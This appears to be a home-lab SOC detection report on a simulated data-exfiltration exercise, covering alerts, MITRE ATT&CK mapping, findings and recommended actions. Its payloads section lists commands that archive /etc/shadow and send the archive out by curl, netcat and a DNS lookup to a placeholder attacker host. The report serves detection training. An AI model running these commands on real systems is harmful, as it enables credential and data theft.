# DATA EXFILTRATION DETECTION REPORT

## Executive Summary
- Detection Type: Data Exfiltration
- Agent: kali (192.168.1.109)
- Total Alerts: 5
- Time Period: 2026-10-11 16:59:37 PKT
- Attack Source: 127.0.0.1 (localhost)

## Alert Details

| Rule ID | Description | Level | MITRE |
|---------|-------------|-------|-------|
| 100005 | Process execution detected via auditd | 10 | T1059 |
| 31514 | File uploaded to server | 6 | T1041 |

## Attack Payloads Detected

1. **Sensitive Data Collection:**
   tar czf /tmp/sensitive.tar.gz /etc/passwd /etc/shadow

2. **DNS Exfiltration:**
   nslookup sensitive-data.attacker.com

3. **HTTP Exfiltration:**
   curl -X POST -F "file=@/tmp/sensitive.tar.gz" http://localhost/upload.php

4. **Netcat Exfiltration:**
   cat /tmp/sensitive.tar.gz | nc 127.0.0.1 4444

## MITRE ATT&CK Mapping
- **T1041** - Exfiltration Over C2 Channel
- **T1048** - Exfiltration Over Alternative Protocol
- **T1059** - Command and Scripting Interpreter
- **Tactic:** Exfiltration, Execution

## Key Findings
1. Sensitive files collected (/etc/passwd, /etc/shadow)
2. Data uploaded to web server
3. DNS exfiltration attempted
4. Auditd detected process execution

## Recommended Actions
1. **Immediate:** No escalation (lab)
2. **Real SOC:** Block exfiltration channel
3. **Real SOC:** Identify compromised data
4. **Real SOC:** Check for persistence
5. **Improvement:** Add exfiltration rules

## Status
**CLOSED** - Lab simulation

## Analyst Notes
Data Exfiltration is a critical post-exploitation technique.
It allows:
- Sensitive data theft
- Credential harvesting
- Financial loss
- Reputation damage

Detection relies on:
- Process monitoring (Auditd)
- Network traffic analysis
- File upload monitoring
- Custom rules (100005)
